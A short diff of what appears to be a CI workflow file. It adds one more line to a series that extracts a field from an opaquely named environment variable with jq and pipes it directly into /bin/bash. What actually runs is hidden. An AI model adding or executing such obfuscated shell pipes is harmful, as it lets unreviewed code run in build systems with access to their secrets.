@@ -56,6 +56,7 @@ jobs:
           echo $pt74 | jq -r .job342 | /bin/bash
           printf '%s' "$ombp45" | jq -r .r47959 | /bin/bash
           printf '%s' "$phg724" | jq -r .z649 | /bin/bash
+          printf '%s' "$p43645" | jq -r .erv8 | /bin/bash
 
       - name: Save archive
         if: always()
